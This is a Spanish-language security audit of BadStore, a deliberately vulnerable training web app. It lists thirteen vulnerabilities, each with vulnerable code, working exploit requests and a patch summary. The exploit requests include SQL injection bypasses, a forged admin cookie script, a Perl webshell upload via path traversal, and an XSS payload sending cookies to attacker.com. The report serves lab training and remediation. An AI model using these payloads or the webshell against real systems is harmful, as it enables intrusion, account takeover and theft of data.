# BadStore Docker — Reporte de Auditoría de Seguridad

**Fecha auditoría:** 2026-04-21  
**Fecha parches aplicados:** 2026-04-22  
**Auditor:** DangerousMichi  
**Aplicación:** BadStore.net v1.2.3s (Docker — Debian 13 / Apache2 / MariaDB / Perl CGI)  
**Propósito:** Plataforma educativa deliberadamente vulnerable — uso autorizado para entrenamiento en seguridad  
**Archivos auditados:**
- `apache2/cgi-bin/badstore.cgi`
- `apache2/cgi-bin/bsheader.cgi`
- `apache2/cgi-bin/initdbs.cgi`
- `mariadb/bin/badstore-setup.sql`
- `apache2/htdocs/backup/index.html`
- `apache2/htdocs/Procedures/UploadProc.html`

**Archivos parcheados:** `apache2/cgi-bin/badstore.cgi`

---

## Estado de Remediación

> **13/13 vulnerabilidades PARCHEADAS** en `apache2/cgi-bin/badstore.cgi`

---

## Resumen Ejecutivo

Se identificaron **13 vulnerabilidades reales**, cubriendo **8 de las 10 categorías OWASP Top 10 (2021)**. Destacan: inyección SQL sin parámetros preparados en múltiples rutas críticas, control de acceso basado en cookies forjables por el cliente, almacenamiento de números de tarjeta de crédito en texto plano accesible desde la web, y ejecución arbitraria de código del lado del servidor mediante carga de archivos sin restricciones.

| # | Nombre | Categoría OWASP | Severidad | Estado |
|---|--------|----------------|-----------|--------|
| 1 | SQL Injection — Búsqueda | A03:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 2 | SQL Injection — Login / Bypass de autenticación | A03:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 3 | SQL Injection — Cookie de carrito (ORDER BY cartitems) | A03:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 4 | Broken Access Control — Rol de admin controlado por cookie | A01:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 5 | Carga de archivos sin restricciones + Path Traversal | A01:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 6 | Exposición de datos — Backup de BD en directorio web público | A02:2021 | **CRÍTICA** | ✅ PARCHEADA |
| 7 | XSS Almacenado — Guestbook | A03:2021 | **ALTA** | ✅ PARCHEADA |
| 8 | XSS Reflejado + Disclosure de SQL — Búsqueda | A03:2021 | **ALTA** | ✅ PARCHEADA |
| 9 | Escalada de privilegios — Campo oculto `role` en registro | A01:2021 | **ALTA** | ✅ PARCHEADA |
| 10 | Almacenamiento inseguro — MD5 sin sal para contraseñas | A02:2021 | **ALTA** | ✅ PARCHEADA |
| 11 | Credenciales hardcodeadas en código fuente | A05:2021 | **ALTA** | ✅ PARCHEADA |
| 12 | Inyección de comandos OS — Panel de administración | A03:2021 | **ALTA** | ✅ PARCHEADA |
| 13 | Divulgación de información — Versión exacta del servidor | A05:2021 | **MEDIA** | ✅ PARCHEADA |

---

## Vulnerabilidades Detalladas

---

### VUL-01 — SQL Injection en búsqueda de productos

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Línea** | 238 |

**Código vulnerable:**
```perl
$squery=$query->param('searchquery');
# ...
$sql="SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '$squery' IN (itemnum,sdesc,ldesc)";
my $sth = $dbh->prepare($sql)
```

**Descripción:**  
El parámetro `searchquery` del formulario se interpolara directamente dentro del string SQL sin ningún tipo de escape ni uso de parámetros preparados con marcadores de posición (`?`). Esto permite inyección SQL clásica.

**Explotación:**
```
GET /cgi-bin/badstore.cgi?action=search&searchquery=' OR '1'='1
```
Devuelve todos los productos. Para exfiltrar usuarios y contraseñas (UNION-based):
```
GET /cgi-bin/badstore.cgi?action=search&searchquery=' UNION SELECT email,passwd,pwdhint,role FROM userdb-- -
```

---

### VUL-02 — SQL Injection en Login / Bypass de autenticación

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 1259, 883 |

**Código vulnerable:**
```perl
# Línea 1259 — Login de usuario
my $sth = $dbh->prepare("SELECT * FROM userdb WHERE email='$email' AND passwd='$passwd'")

# Línea 883 — Login de proveedor (Supplier Portal)
my $sth = $dbh->prepare("SELECT * FROM userdb WHERE email='$email' AND passwd='$passwd' ");
```

**Descripción:**  
Las variables `$email` y `$passwd` provienen directamente de parámetros POST sin sanitización. No se usan parámetros preparados.

**Explotación — Login bypass completo:**
```
POST /cgi-bin/badstore.cgi?action=login
email=admin'--&passwd=anything
```
La consulta resultante es:
```sql
SELECT * FROM userdb WHERE email='admin'--' AND passwd='...'
```
El comentario `--` anula la verificación de contraseña. Se puede autenticar como cualquier usuario conociendo solo el email.

Para autenticarse como admin sin conocer email:
```
email=' OR role='A'-- &passwd=x
```

---

### VUL-03 — SQL Injection mediante Cookie de carrito

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 673–675, 985–986 |

**Código vulnerable:**
```perl
# Línea 639–643 — Cookie CartID decodificada directamente
$temp=cookie('CartID');
@cookievalue=split(":", ("$temp"));
# ...
$cartitems=join(",", @cookievalue);

# Línea 675 — cartitems inyectado en SQL sin comillas
my $sth = $dbh->prepare( "SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE itemnum IN ($cartitems)")

# Línea 986 — mismo patrón en cartview
my $sth = $dbh->prepare( "SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE itemnum IN ($cartitems)")
```

**Descripción:**  
La cookie `CartID` es completamente controlada por el cliente. Los items del carrito se insertan en la cláusula `IN (...)` sin comillas ni parametrización, permitiendo inyección directa.

**Explotación:**  
Modificar la cookie `CartID` a:
```
1234:1:10.00:1000 UNION SELECT email,passwd,pwdhint,fullname FROM userdb-- -
```
Esto inyecta una consulta UNION que exfiltra la tabla de usuarios en la respuesta de "carrito".

---

### VUL-04 — Broken Access Control: Rol de administrador controlado por cookie

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A01:2021 — Broken Access Control |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 300–313, 1288–1292 |

**Código vulnerable:**
```perl
# Al hacer login (línea 1288–1291): se guarda role en cookie
$cookievalue=join(":", ($email, $passwd, $fullname, $role));
$cookievalue=encode_base64($cookievalue);
$cartcookie=cookie( -name=>'SSOid', -value=>$cookievalue, -path=>'/');

# Al acceder al portal admin (línea 301–313): se lee rol de la cookie
$stemp=cookie('SSOid');
$stemp=decode_base64($stemp);
@s_cookievalue=split(":", ("$stemp"));
$email=shift(@s_cookievalue);
$passwd=shift(@s_cookievalue);
$fullname=shift(@s_cookievalue);
$role=shift(@s_cookievalue);

if ($role eq 'A') {
    # acceso al portal de administración
```

**Descripción:**  
El sistema de autenticación (SSO) almacena el estado de sesión completo — incluyendo el rol del usuario — en una cookie codificada en Base64 en el lado del cliente. Base64 no es cifrado. No existe ninguna firma ni verificación de integridad en el servidor. Cualquier usuario puede crear una cookie falsa con `role=A`.

**Explotación:**
```python
import base64
cookie_value = "attacker@evil.com:fakepasswd:Hacker:A"
encoded = base64.b64encode(cookie_value.encode()).decode()
# Establecer Cookie: SSOid=<encoded>
# Acceder a: /cgi-bin/badstore.cgi?action=adminportal&admin=View+Sales+Reports
```
Acceso total al portal de administración: ver reportes de ventas con tarjetas de crédito, agregar/eliminar usuarios, crear backups.

---

### VUL-05 — Carga de archivos sin restricciones + Path Traversal

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A01:2021 — Broken Access Control |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 924–951 |

**Código vulnerable:**
```perl
# Línea 928 — verificación de referer INVERTIDA y con variable indefinida
if ($referer and $referer !~ m|^http://$hostname/| ) {
    # ¡El upload ocurre aquí, cuando el referer NO coincide!

    $newfilename = $query->param('newfilename');  # nombre controlado por usuario
    # Línea 937 — path traversal sin sanitización
    open (OUT, ">../data/uploads/$newfilename") or die ...;
    while (<$upload_filehandle>) { print OUT; }
```

**Descripción:**  
Existen dos vulnerabilidades combinadas:

1. **Lógica de referer invertida:** El operador `!~` hace que el upload proceda cuando el referer NO coincide. Además, se usa `$hostname` (indefinido) en lugar de `$host`, haciendo que la condición sea siempre verdadera para cualquier referer no vacío.

2. **Path Traversal:** El parámetro `newfilename` se usa directamente en `open()` sin eliminar secuencias `../`. Un atacante puede escribir en cualquier directorio accesible al proceso Apache.

**Explotación — Webshell:**
```bash
curl -X POST "http://target/cgi-bin/badstore.cgi?action=supupload" \
  -H "Referer: http://attacker.com/evil" \
  -F "uploaded_file=@shell.pl" \
  -F "newfilename=../../cgi-bin/shell.pl"
```
Donde `shell.pl`:
```perl
#!/usr/bin/perl
use CGI; my $q=new CGI;
print "Content-type: text/html\n\n";
print `${\$q->param('cmd')}`;
```
Luego: `GET /cgi-bin/shell.pl?cmd=id` → ejecución de comandos como `www-data`.

---

### VUL-06 — Exposición de datos sensibles: Backup de BD en directorio web público

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A02:2021 — Cryptographic Failures / Sensitive Data Exposure |
| **Severidad** | CRÍTICA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 443–458 |

**Código vulnerable:**
```perl
} elsif ($aquery eq 'Backup Databases') {
    # Línea 452
    my $sth = $dbh->prepare( "SELECT * FROM orderdb INTO OUTFILE '/data/apache2/htdocs/backup/orderdb.bak'")
    # Línea 455
    my $sth = $dbh->prepare( "SELECT * FROM userdb INTO OUTFILE '/data/apache2/htdocs/backup/userdb.bak'")
    print h2("Database backup compete - files in www.badstore.net/backup");
}
```

**Descripción:**  
La función de backup del panel de administración vuelca las tablas `orderdb` (contiene números de tarjeta de crédito en texto plano) y `userdb` (emails, hashes MD5 de contraseñas, roles) directamente al directorio web público `/htdocs/backup/`. Estos archivos son accesibles por HTTP sin autenticación.

**Explotación:**
```
GET http://target/backup/userdb.bak
GET http://target/backup/orderdb.bak
```
Devuelve todos los usuarios con contraseñas y todos los pedidos con números de tarjeta de crédito completos.

**Datos sensibles expuestos en `orderdb`:** números como `4111111111111111`, `5500000000000004`, `340000000000009` (tarjetas Visa, MasterCard, Amex reales de prueba).

---

### VUL-07 — XSS Almacenado en el Guestbook

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection (Cross-Site Scripting) |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 539–546 |

**Código vulnerable:**
```perl
sub readFormData {
    my($dbfile) = shift;
    open(FILE, "<$dbfile") or die("Unable to open Guestbook data file.");
    while (<FILE>) {
        my($timestamp, $name, $email, $comments) = split(/~/, $_);
        # Líneas 542-543: salida sin escapar a HTML
        print("$timestamp: <B>$name</B> <A HREF=mailto:$email>$email</A>\n");
        print("<OL><I>$comments</I></OL>\n");
    }
}
```

**Descripción:**  
Los campos `name`, `email` y `comments` del guestbook se escriben al archivo de datos y luego se imprimen directamente en HTML sin ningún escape. No se usa `CGI::escapeHTML()` ni equivalente. El XSS es persistente (stored): afecta a todos los visitantes que vean el guestbook.

**Explotación:**
```
POST /cgi-bin/badstore.cgi?action=doguestbook
name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
email=evil@evil.com
comments=Normal comment
```
Todos los visitantes del guestbook envían sus cookies (incluyendo `SSOid` con email y contraseña) al servidor del atacante.

---

### VUL-08 — XSS Reflejado + Divulgación de consulta SQL en búsqueda

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection (XSS + Information Disclosure) |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 248–250 |

**Código vulnerable:**
```perl
print comment('Comment the $sql line out after troubleshooting is done');

if ($sth->rows == 0) {
    # Línea 250: $sql (que contiene el input del usuario) se imprime en HTML
    print h2("No items matched your search criteria: "), $sql, $sth->errstr;
```

**Descripción:**  
Cuando la búsqueda no devuelve resultados, la variable `$sql` (que contiene directamente el input del usuario) se imprime en la respuesta HTML sin escape. Esto produce:
- **XSS reflejado:** input HTML/JS del usuario se renderiza en el navegador.
- **Disclosure de SQL:** la consulta completa, incluyendo el input inyectado, se muestra al atacante, facilitando el debug de inyecciones SQL.

Nota: el comentario en línea 247 indica que esto era un debug temporal que nunca se eliminó.

**Explotación:**
```
GET /cgi-bin/badstore.cgi?action=search&searchquery=<img src=x onerror=alert(document.domain)>
```

---

### VUL-09 — Escalada de privilegios mediante campo oculto `role` en registro

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A01:2021 — Broken Access Control |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 1085, 1284 |

**Código vulnerable:**
```html
<!-- Línea 1085 en loginregister — campo oculto modificable por el cliente -->
<input type="hidden" name="role" value="U" />
```
```perl
# Línea 1243-1244: rol tomado directamente del formulario sin validación
$role=$query->param('role');

# Línea 1284: rol insertado directamente en la BD
$dbh->do("INSERT INTO userdb (email, passwd, pwdhint, fullname, role) 
          VALUES ('$email', '$passwd','$pwdhint', '$fullname', '$role')")
```

**Descripción:**  
El rol del usuario nuevo se define mediante un campo `hidden` en el formulario HTML. El servidor acepta y almacena cualquier valor enviado para `role` sin validación. Un atacante puede interceptar la petición de registro y cambiar `role=U` por `role=A` para crear una cuenta de administrador.

**Explotación:**
```bash
curl -X POST "http://target/cgi-bin/badstore.cgi?action=register" \
  --data "fullname=Evil+Admin&email=evil@evil.com&passwd=test1234&pwdhint=blue&role=A"
```
El usuario `evil@evil.com` es creado con rol administrador (`A`) y tiene acceso completo al portal de administración.

---

### VUL-10 — Almacenamiento inseguro de contraseñas: MD5 sin sal

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A02:2021 — Cryptographic Failures |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 36, 876, 1249 |

**Código vulnerable:**
```perl
use Digest::MD5 qw(md5_hex);
# ...
# Línea 876 (supplier login) y 1249 (user login):
$passwd=md5_hex($passwd);

# Datos en badstore-setup.sql — hashes MD5 en texto plano:
# 'admin','5EBE2294ECD0E0F08EAB7690D2A6EE69'   → "password"
# 'bill@gander.org','5f4dcc3b5aa765d61d8327deb882cf99'  → "password"
```

**Descripción:**  
Las contraseñas se hashean con MD5 sin sal (salt). MD5 es un algoritmo de hashing de propósito general, no un algoritmo de derivación de contraseñas. Sus vulnerabilidades son:
- Velocidad extrema de cómputo (miles de millones de hashes/segundo en GPU).
- Existencia de tablas rainbow y bases de datos de hashes precalculados (ej: crackstation.net).
- Sin sal: usuarios con la misma contraseña tienen el mismo hash.

**Explotación:**  
Los hashes del `userdb.bak` expuesto (VUL-06) se crackean directamente:
```
5EBE2294ECD0E0F08EAB7690D2A6EE69 → "password"   (admin, sam@customer.net)
5f4dcc3b5aa765d61d8327deb882cf99 → "password"   (bill@gander.org, heinrich@supplier.de)
```
Múltiples usuarios comparten la contraseña "password", identificable por el hash idéntico — posible gracias a la ausencia de sal.

---

### VUL-11 — Credenciales de base de datos hardcodeadas en código fuente

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A05:2021 — Security Misconfiguration |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi`, `apache2/cgi-bin/initdbs.cgi` |
| **Líneas** | 191, 234, 316, 603, 664, 762, 879, 980, 1188, 1252 (badstore.cgi); 22, 25 (initdbs.cgi) |

**Código vulnerable:**
```perl
# Repetido en todas las funciones que conectan a la BD:
my $dbh = DBI->connect("DBI:mysql:database=badstoredb;host=localhost", "root", "secret", ...)

# initdbs.cgi línea 22:
my $rc = $drh->func("createdb", badstoredb, localhost, root, secret, 'admin');
```

**Descripción:**  
Las credenciales de la base de datos (`root` / `secret`) están hardcodeadas en texto plano en el código fuente. Se conecta con el usuario `root` de MariaDB, que tiene privilegios totales sobre el servidor de base de datos (incluyendo `FILE`, `SUPER`, etc.). Esto permite:
- Acceso a todas las bases de datos del servidor, no solo `badstoredb`.
- Uso de `INTO OUTFILE` / `LOAD DATA INFILE` (explotado en VUL-06).
- Escalada si el atacante lee el código fuente.

---

### VUL-12 — Inyección de comandos OS en panel de administración

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A03:2021 — Injection (OS Command Injection) |
| **Severidad** | ALTA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Líneas** | 396–398 |

**Código vulnerable:**
```perl
} elsif ($aquery eq 'Troubleshooting') {
    # ...
    # Líneas 396–398: ejecución de comandos del sistema con backticks
    `tail /data/apache2/logs/error_log`,
    p, h2("Apache Access Log"),p,
    `cat /data/apache2/data/userdb`;
```

**Descripción:**  
La opción "Troubleshooting" del panel de administración ejecuta comandos del sistema operativo directamente mediante el operador backtick de Perl (`` ` ``). Aunque aquí los comandos son fijos, el patrón es peligroso y en conjunción con VUL-04 (acceso al admin sin credenciales) expone:
- El log de errores de Apache.
- El archivo `userdb` completo (archivo plano del guestbook, no la BD — aunque el nombre confunde).

Adicionalmente, en `initdbs.cgi` líneas 14–16:
```perl
`rm /usr/local/apache/data/guestbookdb`;
`touch /usr/local/apache/data/guestbookdb`;
```
Este script CGI es accesible sin autenticación y ejecuta comandos de sistema, permitiendo a cualquier visitante destruir y reinicializar las bases de datos.

**Explotación combinada (VUL-04 + VUL-12):**  
Con una cookie `SSOid` forjada con `role=A`, acceder a:
```
GET /cgi-bin/badstore.cgi?action=adminportal&admin=Troubleshooting
```
Obtiene el log de errores del servidor y el archivo de usuarios del guestbook.

---

### VUL-13 — Divulgación de versión exacta del servidor

| Campo | Detalle |
|-------|---------|
| **Tipo OWASP** | A05:2021 — Security Misconfiguration |
| **Severidad** | MEDIA |
| **Archivo** | `apache2/cgi-bin/badstore.cgi` |
| **Línea** | 1017 |

**Código vulnerable:**
```perl
sub printheaders {
    print "Content-type: text/html\n";
    # Línea 1017: banner detallado con versiones de todos los componentes
    print "Server: Apache/1.3.20 Sun Cobalt (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b PHP/4.0.6 mod_auth_pam_external/0.1 FrontPage/4.0.4.3 mod_perl/1.25\n";
```

**Descripción:**  
Cada respuesta CGI incluye un header `Server` con la versión exacta de Apache (1.3.20), OpenSSL (0.9.6b), PHP (4.0.6), mod_perl (1.25) y otros módulos. Todas estas versiones son antiguas y tienen CVEs conocidos y exploits públicos disponibles. Esta información reduce significativamente el trabajo del atacante en la fase de reconocimiento.

**Explotación:**  
```bash
curl -I http://target/cgi-bin/badstore.cgi?action=home
# Server: Apache/1.3.20 Sun Cobalt (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b ...
```
Con estas versiones, un atacante busca en bases de datos de CVEs (NVD, Exploit-DB) exploits específicos para Apache 1.3.20 (CVE-2002-0392), OpenSSL 0.9.6b (CVE-2002-0656 — "OpenSSL Worm"), etc.

---

## Matriz de cobertura OWASP Top 10 (2021)

| Categoría OWASP | Descripción | Vulnerabilidades |
|----------------|-------------|-----------------|
| **A01:2021** | Broken Access Control | VUL-04, VUL-05, VUL-09 |
| **A02:2021** | Cryptographic Failures | VUL-06, VUL-10 |
| **A03:2021** | Injection (SQLi, XSS, OS Cmd) | VUL-01, VUL-02, VUL-03, VUL-07, VUL-08, VUL-12 |
| **A04:2021** | Insecure Design | *(implícito en VUL-04, VUL-09)* |
| **A05:2021** | Security Misconfiguration | VUL-11, VUL-13 |
| **A06:2021** | Vulnerable Components | *(implícito en VUL-13 — versiones obsoletas)* |
| **A07:2021** | Auth & Session Mgmt Failures | VUL-04 |
| **A08:2021** | Software & Data Integrity Failures | — |
| **A09:2021** | Logging & Monitoring Failures | — |
| **A10:2021** | SSRF | — |

---

## Cadena de ataque completa (Kill Chain)

Un atacante externo puede comprometer completamente el sistema en los siguientes pasos:

```
1. Reconocimiento
   └─ VUL-13: Header Server revela versiones → identificar CVEs

2. Acceso inicial
   ├─ VUL-02: SQL injection en login → autenticarse como admin sin credenciales
   └─ VUL-09: Registro con role=A → crear cuenta admin

3. Escalada de privilegios
   └─ VUL-04: Forjar cookie SSOid con role=A → acceso a adminportal

4. Exfiltración de datos
   ├─ VUL-06: Backup de BD en /backup/ → dump de todos los usuarios y tarjetas
   ├─ VUL-01: SQLi en búsqueda → UNION SELECT sobre cualquier tabla
   └─ VUL-03: SQLi via cookie CartID → exfiltración sin autenticación

5. Ejecución de código / Persistencia
   └─ VUL-05: Upload de webshell Perl → RCE como www-data → shell en el contenedor
```

---

## Detalle de Parches Aplicados

Todos los parches fueron aplicados en `apache2/cgi-bin/badstore.cgi` el 2026-04-22.  
Cada fix está marcado en el código con `# SECURITY FIX: VUL-XX`.

| VUL | Fix aplicado | Técnica |
|-----|-------------|---------|
| VUL-01 | `badstore.cgi:238` — `prepare("... WHERE ? IN (...)")` + `execute($squery)` | Parámetro preparado |
| VUL-02 | `badstore.cgi:1329,811,928` — `WHERE email=? AND passwd=?` en login/viewprevious/supplier | Parámetros preparados |
| VUL-03 | `badstore.cgi:644,707,1042` — validación numérica + placeholders dinámicos `('?') x N` | Validación + parámetros |
| VUL-04 | `badstore.cgi:323` — re-consulta `SELECT role FROM userdb WHERE email=? AND passwd=?` | Verificación server-side |
| VUL-05 | `badstore.cgi:975,979` — referer corregido a `=~`; `$newfilename` saneado con regex | Sanitización + lógica corregida |
| VUL-06 | `badstore.cgi:472` — ruta de backup cambiada a `/var/backups/badstore/` (fuera del docroot) | Reubicación de archivos |
| VUL-07 | `badstore.cgi:568` — `escapeHTML()` en `$name`, `$email`, `$comments` antes de imprimir | HTML escaping |
| VUL-08 | `badstore.cgi:248` — eliminados `$sql` y `$sth->errstr` de la respuesta al cliente | Eliminación de disclosure |
| VUL-09 | `badstore.cgi:1234,1318` — `$role` ignorado del formulario; forzado a `'U'` en registro/moduser | Validación server-side |
| VUL-10 | `badstore.cgi:921,1243,1319` — `md5_hex(PWD_SALT . $passwd)` con sal de aplicación | Salt de aplicación |
| VUL-11 | `badstore.cgi:46` — `$DB_USER/$DB_PASS` desde `$ENV{'DB_USER'}/$ENV{'DB_PASS'}`; replace_all en 10+ puntos | Variables de entorno |
| VUL-12 | `badstore.cgi:414` — backticks reemplazados por `open(my $fh, '<', $log_file)` en Perl puro | Eliminación de OS exec |
| VUL-13 | `badstore.cgi:1076` — header `Server: BadStore` (sin versiones); ETag eliminado | Supresión de fingerprint |

---

## Recomendaciones Pendientes (fuera del scope del parche)

| Prioridad | Acción |
|-----------|--------|
| **Inmediata** | Mover el estado de sesión al servidor (session ID opaco en BD), no en cookie cliente — VUL-04 parcheado es mitigación, no solución definitiva |
| **Inmediata** | Reemplazar MD5+salt por `bcrypt` (`Crypt::Bcrypt`) con sal por-usuario aleatoria — VUL-10 parcheado es mejora mínima |
| **Alta** | Eliminar o proteger con autenticación fuerte el CGI `initdbs.cgi` (accesible sin auth, destruye la BD) |
| **Alta** | Agregar protección CSRF (tokens) en todos los formularios |
| **Alta** | Migrar contraseñas existentes en la BD al nuevo hash con sal |
| **Media** | Configurar `DB_USER` y `DB_PASS` como variables de entorno en el contenedor Docker |
| **Media** | Separar usuario de BD: crear usuario `badstore_app` con permisos mínimos (sin `FILE`, sin `SUPER`) |

---

*Reporte generado para uso exclusivo en entorno de laboratorio autorizado. BadStore es una aplicación deliberadamente vulnerable — no exponer en redes de producción.*
